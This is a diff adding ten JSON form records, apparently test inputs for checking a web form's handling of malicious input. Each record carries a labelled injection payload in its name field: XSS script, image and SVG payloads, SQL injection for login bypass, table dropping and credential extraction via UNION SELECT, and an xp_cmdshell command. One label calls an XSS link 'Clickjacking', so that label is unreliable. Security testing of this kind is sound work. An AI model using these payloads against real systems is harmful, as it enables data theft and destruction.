@@ -1,0 +1,60 @@
+{
+  "firstName": "<script>alert('XSS')</script>",
+  "lastName": "Smith",
+  "email": "test@example.com",
+  "fcomment": "XSS (Cross-Site Scripting)"
+}
+{
+  "firstName": "' OR '1'='1",
+  "lastName": "Hacker",
+  "email": "hacker@example.com",
+  "fcomment": "SQL Injection (Authentication Bypass)"
+}
+{
+  "firstName": "Robert'); DROP TABLE users;--",
+  "lastName": "Little Bobby Tables",
+  "email": "drop@sqlinject.com",
+  "fcomment": "SQL Injection (Database Manipulation)"
+}
+{
+  "firstName": "admin' --",
+  "lastName": "Bypass",
+  "email": "bypass@example.com",
+  "fcomment": "SQL Injection (Login Bypass)"
+}
+{
+  "firstName": "<img src=x onerror=alert('XSS')>",
+  "lastName": "Inject",
+  "email": "xss@attack.com",
+  "fcomment": "XSS (Stored XSS via Image)"
+}
+{
+  "firstName": "'; EXEC xp_cmdshell('dir'); --",
+  "lastName": "Command",
+  "email": "cmd@inject.com",
+  "fcomment": "Command Injection (Executing System Commands)"
+}
+{
+  "firstName": "<svg/onload=alert('XSS')>",
+  "lastName": "Script",
+  "email": "svg@xss.com",
+  "fcomment": "XSS (SVG Payload)"
+}
+{
+  "firstName": "' UNION SELECT username, password FROM users --",
+  "lastName": "UnionHack",
+  "email": "union@inject.com",
+  "fcomment": "SQL Injection (Extracting User Credentials)"
+}
+{
+  "firstName": "<a href='javascript:alert(\"XSS\")'>Click me</a>",
+  "lastName": "Clickjack",
+  "email": "click@jack.com",
+  "fcomment": "Clickjacking (JavaScript Injection via Link)"
+}
+{
+  "firstName": "' OR '1'='1' /*",
+  "lastName": "Wildcard",
+  "email": "wildcard@sql.com",
+  "fcomment": "SQL Injection (Wildcard Comment Bypass)"
+}
